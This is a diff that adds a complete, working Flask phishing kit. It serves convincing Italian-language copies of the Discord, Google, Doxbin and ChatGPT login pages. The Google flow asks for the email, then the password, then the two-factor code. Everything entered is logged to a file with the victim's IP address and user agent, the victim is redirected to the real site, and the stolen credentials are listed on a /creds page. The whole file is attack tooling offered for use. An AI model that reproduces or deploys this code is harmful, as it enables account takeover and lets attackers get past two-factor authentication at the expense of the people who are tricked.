@@ -1,0 +1,349 @@
+#!/usr/bin/env python3
+# TalmenteTantiPesciCheMancoLaMammaDiEsaurizioneNelPrime.py
+# coded by la mamma di esaurizione e l'opsec in persona
+# pip install flask && python TalmenteTantiPesciCheMancoLaMammaDiEsaurizioneNelPrime.py
+
+import argparse
+import json
+import os
+from datetime import datetime
+
+from flask import Flask, redirect, request, render_template_string, session
+
+BASE = os.path.dirname(os.path.abspath(__file__))
+LOG = os.path.join(BASE, "creds.jsonl")
+
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+
+C, G, Y, B, D, X = "\033[36m", "\033[32m", "\033[33m", "\033[34m", "\033[2m", "\033[0m"
+
+
+def save(site, data, step=""):
+    entry = {
+        "ts": datetime.now().isoformat(timespec="seconds"),
+        "site": site,
+        "step": step,
+        "ip": request.remote_addr,
+        "ua": request.headers.get("User-Agent", "")[:180],
+        "data": data,
+    }
+    with open(LOG, "a", encoding="utf-8") as f:
+        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+
+    print(f"\n{B}┌─[{C}{site}{B}]{X} {D}{entry['ts']}{X}")
+    for k, v in data.items():
+        if v:
+            print(f"{B}│{X} {G}{k}{X}: {v}")
+    print(f"{B}└────────────────────────{X}")
+
+
+INDEX = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>TalmenteTantiPesci</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#0b0d10;color:#e6e6e6;
+font:14px ui-monospace,Menlo,monospace;display:flex;min-height:100vh;
+align-items:center;justify-content:center;padding:24px}
+.box{width:100%;max-width:420px}
+h1{font-size:13px;font-weight:400;color:#8b8b8b;margin:0 0 18px}
+h1 b{color:#6ee7a8;font-weight:400}
+a.row{display:flex;justify-content:space-between;padding:13px 16px;margin-bottom:8px;
+border:1px solid #24282e;border-radius:8px;color:#e6e6e6;text-decoration:none;background:#111419}
+a.row:hover{border-color:#3a4048;background:#161a20}
+a.row span{color:#6b7280;font-size:12px}
+.f{margin-top:16px;font-size:11px;color:#5b616b}
+</style></head><body><div class="box">
+<h1>coded by <b>la mamma di esaurizione</b> e <b>l'opsec in persona</b></h1>
+<a class="row" href="/discord">discord <span>login</span></a>
+<a class="row" href="/google">google <span>login</span></a>
+<a class="row" href="/doxbin">doxbin <span>login</span></a>
+<a class="row" href="/chatgpt">chatgpt <span>login</span></a>
+<div class="f">log: <a href="/creds" style="color:#6b7280">/creds</a></div>
+</div></body></html>"""
+
+
+DISCORD = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi | Discord</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:#313338;display:flex;
+align-items:center;justify-content:center;padding:20px;
+font:400 16px/1.4 "gg sans","Noto Sans",Helvetica,Arial,sans-serif;color:#f2f3f5}
+.card{width:100%;max-width:480px;background:#313338;border-radius:5px;padding:32px;
+box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center}
+.logo{width:52px;height:52px;margin-bottom:14px}
+h1{font-size:24px;font-weight:600;margin:0 0 8px}
+.sub{color:#b5bac1;margin:0 0 20px;font-size:16px}
+form{text-align:left}
+label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;
+letter-spacing:.02em;margin:0 0 8px}
+.req{color:#f23f43}
+input{width:100%;padding:10px;background:#1e1f22;border:0;border-radius:3px;color:#f2f3f5;
+font:inherit;font-size:16px;margin-bottom:18px;outline:none}
+input:focus{box-shadow:0 0 0 2px #5865f2}
+.link{display:block;color:#00a8fc;font-size:14px;text-decoration:none;margin:-6px 0 20px}
+.link:hover{text-decoration:underline}
+button{width:100%;padding:12px;border:0;border-radius:3px;background:#5865f2;color:#fff;
+font:inherit;font-weight:600;cursor:pointer}
+button:hover{background:#4752c4}
+.reg{margin:16px 0 0;font-size:14px;color:#949ba4}
+.reg a{color:#00a8fc;text-decoration:none}
+</style></head><body>
+<div class="card">
+<svg class="logo" viewBox="0 0 24 24" fill="#fff"><path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8505-.2838-3.6885-.2838-5.5006 0-.1636-.3932-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>
+<h1>Bentornato!</h1><p class="sub">Ci siamo mancati!</p>
+<form method="post" action="/capture/discord">
+<label for="e">Email o numero di telefono <span class="req">*</span></label>
+<input id="e" name="email" type="text" autocomplete="off" autofocus required>
+<label for="p">Password <span class="req">*</span></label>
+<input id="p" name="password" type="password" autocomplete="off" required>
+<a class="link" href="https://discord.com/">Password dimenticata?</a>
+<button type="submit">Accedi</button>
+</form>
+<p class="reg">Hai bisogno di un account? <a href="https://discord.com/register">Registrati</a></p>
+</div>
+<!-- coded by la mamma di esaurizione e l'opsec in persona -->
+</body></html>"""
+
+
+G_CSS = """
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:#fff;color:#202124;
+font:400 14px/1.5 Roboto,Arial,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:448px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center}
+.g{width:48px;height:48px}
+h1{font-size:24px;font-weight:400;margin:16px 0 8px;color:#202124}
+.sub{color:#202124;margin:0 0 26px;font-size:16px}
+form{text-align:left}
+.f{position:relative;margin-bottom:22px}
+.f input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font:inherit;
+font-size:16px;color:#202124;outline:none;background:#fff}
+.f input:focus{border:2px solid #1a73e8;padding:12px 14px}
+.f label{position:absolute;left:12px;top:-8px;background:#fff;padding:0 4px;color:#5f6368;font-size:12px}
+.chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;
+padding:4px 12px 4px 6px;font-size:14px;margin-bottom:24px;color:#3c4043}
+.chip .a{width:20px;height:20px;border-radius:50%;background:#1a73e8;color:#fff;font-size:11px;
+display:flex;align-items:center;justify-content:center}
+.hint{font-size:12px;color:#5f6368;margin-top:8px}
+.row{display:flex;align-items:center;justify-content:space-between;margin-top:26px}
+.row a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}
+.row a:hover{text-decoration:underline}
+button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;
+font:inherit;font-weight:500;font-size:14px;cursor:pointer}
+button:hover{background:#1765cc}
+.foot{margin-top:28px;font-size:12px;color:#5f6368;display:flex;justify-content:space-between}
+.chk{display:flex;gap:8px;align-items:center;font-size:14px;color:#202124;margin-top:20px}
+"""
+
+G_LOGO = '<svg class="g" viewBox="0 0 48 48"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>'
+
+G_FOOT = '<div class="foot"><span>Italiano (Italia)</span><span>Guida&nbsp;&nbsp;Privacy&nbsp;&nbsp;Termini</span></div>'
+
+GOOGLE_EMAIL = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi - Account Google</title>
+<style>__CSS__</style></head><body><div class="card">__LOGO__
+<h1>Accedi</h1><p class="sub">Usa il tuo account Google</p>
+<form method="post" action="/capture/google">
+<input type="hidden" name="step" value="identifier">
+<div class="f"><input id="e" name="email" type="text" autocomplete="off" autofocus required>
+<label for="e">Email o telefono</label></div>
+<div class="hint">Non ricordi l'indirizzo? <a href="https://accounts.google.com/" style="color:#1a73e8;text-decoration:none">Recupera</a></div>
+<div class="row"><a href="https://accounts.google.com/signup">Crea account</a><button type="submit">Avanti</button></div>
+</form>__FOOT__</div></body></html>"""
+
+GOOGLE_PASS = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi - Account Google</title>
+<style>__CSS__</style></head><body><div class="card">__LOGO__
+<h1>Benvenuto</h1>
+<div class="chip"><span class="a">A</span>{{ email }}</div>
+<form method="post" action="/capture/google">
+<input type="hidden" name="step" value="password">
+<div class="f"><input id="p" name="password" type="password" autocomplete="off" autofocus required>
+<label for="p">Inserisci la password</label></div>
+<label class="chk"><input type="checkbox" onclick="var p=document.getElementById('p');p.type=p.type==='password'?'text':'password'"> Mostra password</label>
+<div class="row"><a href="https://accounts.google.com/">Password dimenticata?</a><button type="submit">Avanti</button></div>
+</form>__FOOT__</div></body></html>"""
+
+GOOGLE_2FA = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifica in due passaggi</title>
+<style>__CSS__</style></head><body><div class="card">__LOGO__
+<h1>Verifica in due passaggi</h1>
+<p class="sub">Inserisci il codice di 6 cifre generato dall'app Authenticator per <b>{{ email }}</b></p>
+<form method="post" action="/capture/google">
+<input type="hidden" name="step" value="2fa">
+<div class="f"><input id="c" name="code" type="text" inputmode="numeric" maxlength="8" autocomplete="off" autofocus required>
+<label for="c">Codice</label></div>
+<div class="row"><a href="https://accounts.google.com/">Prova un altro modo</a><button type="submit">Avanti</button></div>
+</form>__FOOT__</div></body></html>"""
+
+
+DOXBIN = """<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>doxbin - login</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:#000;color:#d7d7d7;
+font:13px/1.6 ui-monospace,Consolas,monospace;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:360px;border:1px solid #2a2a2a;padding:28px;background:#050505}
+h1{font-size:20px;margin:0 0 4px;font-weight:400;letter-spacing:-.5px;color:#fff}
+h1 span{color:#7a7a7a}
+.sub{color:#6a6a6a;font-size:11px;margin:0 0 22px}
+label{display:block;font-size:11px;color:#8a8a8a;margin:0 0 5px}
+input{width:100%;padding:8px;background:#0d0d0d;border:1px solid #2a2a2a;color:#e6e6e6;
+font:inherit;outline:none;margin-bottom:14px}
+input:focus{border-color:#5a5a5a}
+button{width:100%;padding:9px;background:#e6e6e6;color:#000;border:0;font:inherit;
+font-weight:600;cursor:pointer;margin-top:4px}
+button:hover{background:#fff}
+.f{margin-top:18px;font-size:11px;color:#5c5c5c;display:flex;justify-content:space-between}
+.f a{color:#8a8a8a;text-decoration:none}
+.f a:hover{text-decoration:underline}
+</style></head><body><div class="card">
+<h1>doxbin<span>_</span></h1>
+<p class="sub">private pastebin for dox documents</p>
+<form method="post" action="/capture/doxbin">
+<label for="u">username</label>
+<input id="u" name="username" type="text" autocomplete="off" autofocus required>
+<label for="p">password</label>
+<input id="p" name="password" type="password" autocomplete="off" required>
+<button type="submit">login</button>
+</form>
+<div class="f"><a href="https://doxbin.org/">forgot</a><a href="https://doxbin.org/register">register</a></div>
+</div></body></html>"""
+
+
+CHATGPT = """<!doctype html><html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi - ChatGPT</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:#fff;color:#0d0d0d;
+font:400 14px/1.5 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;text-align:center}
+.logo{width:38px;height:38px;margin-bottom:20px}
+h1{font-size:22px;font-weight:500;margin:0 0 6px}
+.sub{color:#6e6e80;margin:0 0 26px;font-size:14px}
+form{text-align:left}
+label{display:block;font-size:12px;color:#4b4b57;margin:0 0 6px}
+input{width:100%;padding:11px 13px;border:1px solid #d9d9e3;border-radius:8px;font:inherit;
+font-size:15px;outline:none;margin-bottom:16px;color:#0d0d0d}
+input:focus{border-color:#0d0d0d}
+button{width:100%;padding:12px;border:0;border-radius:8px;background:#0d0d0d;color:#fff;
+font:inherit;font-weight:500;font-size:15px;cursor:pointer}
+button:hover{background:#2b2b2b}
+.alt{display:flex;align-items:center;gap:10px;color:#8e8ea0;font-size:12px;margin:22px 0}
+.alt::before,.alt::after{content:"";flex:1;height:1px;background:#e5e5e5}
+.reg{margin-top:22px;font-size:13px;color:#6e6e80}
+.reg a{color:#0d0d0d;font-weight:500;text-decoration:none}
+.reg a:hover{text-decoration:underline}
+.f{margin-top:30px;font-size:11px;color:#b4b4c0}
+</style></head><body><div class="card">
+<svg class="logo" viewBox="0 0 24 24" fill="#0d0d0d"><path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.02 6.0651 6.0651 0 0 0 .5157 4.9108 6.0462 6.0462 0 0 0 6.5098 2.9A6.0651 6.0651 0 0 0 19.0256 19.716a5.9847 5.9847 0 0 0 3.9977-2.9 6.0462 6.0462 0 0 0-.7414-6.9949zm-9.2037 11.8789a4.5 4.5 0 0 1-2.9-1.06l.14-.08 4.82-2.78a.79.79 0 0 0 .4-.68v-6.79l2.04 1.18a.07.07 0 0 1 .04.06v5.62a4.52 4.52 0 0 1-4.54 4.53zm-9.679-5.36a4.48 4.48 0 0 1-.54-3.02l.14.09 4.82 2.78a.79.79 0 0 0 .79 0l5.88-3.4v2.36a.08.08 0 0 1-.03.06l-4.87 2.81a4.52 4.52 0 0 1-6.19-1.68zm-1.1-9.2a4.5 4.5 0 0 1 2.35-1.98v5.73a.79.79 0 0 0 .4.68l5.88 3.4-2.04 1.18a.08.08 0 0 1-.07 0L3.16 12.44a4.52 4.52 0 0 1-1.06-5.3zm14.53 3.46l-5.88-3.4L15 8.02a.08.08 0 0 1 .07 0l4.87 2.81a4.51 4.51 0 0 1-.7 8.13v-5.73a.79.79 0 0 0-.41-.68zm2.03-3.05l-.14-.09-4.82-2.78a.79.79 0 0 0-.79 0L9.23 10.08V7.72a.08.08 0 0 1 .03-.06l4.87-2.81a4.52 4.52 0 0 1 6.71 4.7zM8.19 15.2l-2.04-1.18a.07.07 0 0 1-.04-.06V8.34a4.52 4.52 0 0 1 7.42-3.45l-.14.08-4.82 2.78a.79.79 0 0 0-.4.68zm1.11-2.4l2.62-1.51 2.62 1.51v3.02l-2.62 1.51-2.62-1.51z"/></svg>
+<h1>Bentornato</h1>
+<p class="sub">Accedi per continuare su ChatGPT</p>
+<form method="post" action="/capture/chatgpt">
+<label for="e">Indirizzo email</label>
+<input id="e" name="email" type="text" autocomplete="off" autofocus required>
+<label for="p">Password</label>
+<input id="p" name="password" type="password" autocomplete="off" required>
+<button type="submit">Accedi</button>
+</form>
+<div class="alt">oppure</div>
+<p class="reg">Non hai un account? <a href="https://chatgpt.com/auth/login">Registrati</a></p>
+<p class="f">Termini di utilizzo &middot; Informativa sulla privacy</p>
+</div></body></html>"""
+
+
+@app.route("/")
+def index():
+    return INDEX
+
+
+@app.route("/discord")
+def discord():
+    return DISCORD
+
+
+@app.route("/doxbin")
+def doxbin():
+    return DOXBIN
+
+
+@app.route("/chatgpt")
+def chatgpt():
+    return CHATGPT
+
+
+def g_page(tpl, **ctx):
+    return render_template_string(
+        tpl.replace("__CSS__", G_CSS).replace("__LOGO__", G_LOGO).replace("__FOOT__", G_FOOT),
+        **ctx,
+    )
+
+
+@app.route("/google")
+def google():
+    session.pop("g_email", None)
+    return g_page(GOOGLE_EMAIL)
+
+
+@app.route("/google/password")
+def google_pass():
+    return g_page(GOOGLE_PASS, email=session.get("g_email", ""))
+
+
+@app.route("/google/2fa")
+def google_2fa():
+    return g_page(GOOGLE_2FA, email=session.get("g_email", ""))
+
+
+@app.route("/capture/<site>", methods=["POST"])
+def capture(site):
+    data = dict(request.form)
+    step = data.pop("step", "")
+
+    if site == "google":
+        if step == "identifier":
+            session["g_email"] = data.get("email", "")
+            save(site, data, step)
+            return redirect("/google/password")
+        if step == "password":
+            save(site, data, step)
+            return redirect("/google/2fa")
+        save(site, data, step)
+        session.pop("g_email", None)
+        return redirect("https://myaccount.google.com/")
+
+    save(site, data)
+    return redirect({
+        "discord": "https://discord.com/login",
+        "doxbin": "https://doxbin.org/login",
+        "chatgpt": "https://chatgpt.com/",
+    }.get(site, "/"))
+
+
+@app.route("/creds")
+def creds():
+    rows = []
+    if os.path.exists(LOG):
+        with open(LOG, encoding="utf-8") as f:
+            for line in f.readlines()[-200:][::-1]:
+                try:
+                    e = json.loads(line)
+                except ValueError:
+                    continue
+                flat = " · ".join(f"{k}={v}" for k, v in e["data"].items() if v)
+                rows.append(f"<tr><td>{e['ts']}</td><td>{e['site']}</td><td>{flat}</td></tr>")
+    body = "".join(rows) or "<tr><td colspan=3>nessuna credenziale</td></tr>"
+    return f"""<!doctype html><meta charset=utf-8><title>creds</title>
+<style>body{{background:#0b0d10;color:#d7d7d7;font:12px ui-monospace,monospace;padding:20px}}
+table{{border-collapse:collapse;width:100%}}td{{border-bottom:1px solid #22262c;padding:7px}}
+td:nth-child(2){{color:#6ee7a8}}td:nth-child(3){{color:#fff}}</style>
+<h3>creds.jsonl</h3><table>{body}</table>"""
+
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--port", type=int, default=8080)
+    a = ap.parse_args()
+
+    print(f"{G}TalmenteTantiPesciCheMancoLaMammaDiEsaurizioneNelPrime{X}")
+    print(f"{D}coded by la mamma di esaurizione e l'opsec in persona{X}")
+    print(f"{C}http://127.0.0.1:{a.port}{X}\n")
+
+    app.run(host="127.0.0.1", port=a.port, debug=False, threaded=True)
